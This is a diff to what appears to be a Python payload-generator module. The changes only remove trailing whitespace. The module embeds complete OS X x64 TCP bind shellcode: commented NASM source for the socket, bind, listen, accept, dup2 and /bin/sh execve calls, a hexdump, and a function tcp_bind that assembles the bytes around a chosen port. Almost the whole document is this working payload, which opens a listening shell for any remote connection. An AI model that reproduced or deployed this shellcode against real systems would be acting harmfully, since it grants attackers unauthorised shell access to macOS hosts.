@@ -9,18 +9,18 @@ OS X x64 - tcp bind shellcode, NULL byte free (144 bytes)
 ;OS X x64, TCP bind shellcode (port 4444), NULL byte free, 144 bytes long
 ;ASM code
 ;compile:
-;nasm -f macho64 bind-shellcode.asm 
+;nasm -f macho64 bind-shellcode.asm
 ;ld -macosx_version_min 10.7.0 -o bindsc bind-shellcode.o
- 
+
 BITS 64
- 
+
 global start
- 
+
 section .text
- 
+
 ;Argument order: rdi, rsi, rdx, rcx
- 
- 
+
+
 start:
     ;socket
     xor     rdi,rdi                 ;zero out RSI
@@ -28,7 +28,7 @@ start:
     xor     rsi,rsi                 ;zero out RSI
     mov     sil, 0x1                ;SOCK_STREAM = 1
     xor     rdx, rdx                ;protocol = IP = 0
-     
+
     ;store syscall number on RAX
     xor     rax,rax                 ;zero out RAX
     mov     al,2                    ;put 2 to AL -> RAX = 0x0000000000000002
@@ -36,7 +36,7 @@ start:
     mov     al,0x61                 ;move 3b to AL (execve socket#) -> RAX = 0x0000000002000061
     mov     r12, rax                ;save RAX
     syscall                         ;trigger syscall
-     
+
     ;bind
     mov     r9, rax                 ;save socket number
     mov     rdi, rax                ;put return value to RDI int socket
@@ -50,7 +50,7 @@ start:
     add     r12b, 0x7               ;RAX = 0x0000000002000068 bind
     mov     rax, r12                ;restore RAX
     syscall
-     
+
     ;listen
     ;RDI already contains the socket number
     xor     rsi, rsi                ;zero out RSI
@@ -58,24 +58,24 @@ start:
     add     r12b, 0x2               ;RAX = 0x000000000200006a listen
     mov     rax, r12                ;restore RAX
     syscall
-     
-    ;accept 30  AUE_ACCEPT  ALL { int accept(int s, caddr_t name, socklen_t *anamelen); } 
+
+    ;accept 30  AUE_ACCEPT  ALL { int accept(int s, caddr_t name, socklen_t *anamelen); }
     ;RDI already contains the socket number
     xor     rsi, rsi                ;zero out RSI
     ;RDX is already zero
     sub     r12b, 0x4c              ;RAX = 0x000000000200001e accept
     mov     rax, r12                ;restore RAX
     syscall
-     
-    ;int dup2(u_int from, u_int to); 
+
+    ;int dup2(u_int from, u_int to);
     mov     rdi, rax
     xor     rsi, rsi
     add     r12b, 0x3c              ;RAX = 0x000000000200005a dup2
     mov     rax, r12                ;restore RAX
     syscall
- 
+
 /*
-$ nasm -f bin bind-shellcode.asm 
+$ nasm -f bin bind-shellcode.asm
 $ hexdump bind-shellcode
 0000000 48 31 ff 40 b7 02 48 31 f6 40 b6 01 48 31 d2 48
 0000010 31 c0 b0 02 48 c1 c8 28 b0 61 49 89 c4 0f 05 49
@@ -88,22 +88,22 @@ $ hexdump bind-shellcode
 0000080 57 48 89 e7 48 31 d2 41 80 ec 1f 4c 89 e0 0f 05
 0000090
 */
- 
+
 """
 
 # mov     esi, 0x5c110201         ;port number 4444 (=0x115c)
 
 
 def tcp_bind( PORT):
-    shellcode =  r"\x48\x31\xff\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\x48\x31\xd2\x48" 
-    shellcode += r"\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x61\x49\x89\xc4\x0f\x05\x49" 
+    shellcode =  r"\x48\x31\xff\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\x48\x31\xd2\x48"
+    shellcode += r"\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x61\x49\x89\xc4\x0f\x05\x49"
     shellcode += r"\x89\xc1\x48\x89\xc7\x48\x31\xf6\x56\xbe\x01\x02"
     shellcode += PORT
-    shellcode += r"\x83\xee" 
-    shellcode += r"\x01\x56\x48\x89\xe6\xb2\x10\x41\x80\xc4\x07\x4c\x89\xe0\x0f\x05" 
-    shellcode += r"\x48\x31\xf6\x48\xff\xc6\x41\x80\xc4\x02\x4c\x89\xe0\x0f\x05\x48" 
-    shellcode += r"\x31\xf6\x41\x80\xec\x4c\x4c\x89\xe0\x0f\x05\x48\x89\xc7\x48\x31" 
-    shellcode += r"\xf6\x41\x80\xc4\x3c\x4c\x89\xe0\x0f\x05\x48\xff\xc6\x4c\x89\xe0" 
-    shellcode += r"\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68" 
+    shellcode += r"\x83\xee"
+    shellcode += r"\x01\x56\x48\x89\xe6\xb2\x10\x41\x80\xc4\x07\x4c\x89\xe0\x0f\x05"
+    shellcode += r"\x48\x31\xf6\x48\xff\xc6\x41\x80\xc4\x02\x4c\x89\xe0\x0f\x05\x48"
+    shellcode += r"\x31\xf6\x41\x80\xec\x4c\x4c\x89\xe0\x0f\x05\x48\x89\xc7\x48\x31"
+    shellcode += r"\xf6\x41\x80\xc4\x3c\x4c\x89\xe0\x0f\x05\x48\xff\xc6\x4c\x89\xe0"
+    shellcode += r"\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
     shellcode += r"\x57\x48\x89\xe7\x48\x31\xd2\x41\x80\xec\x1f\x4c\x89\xe0\x0f\x05"
     return shellcode
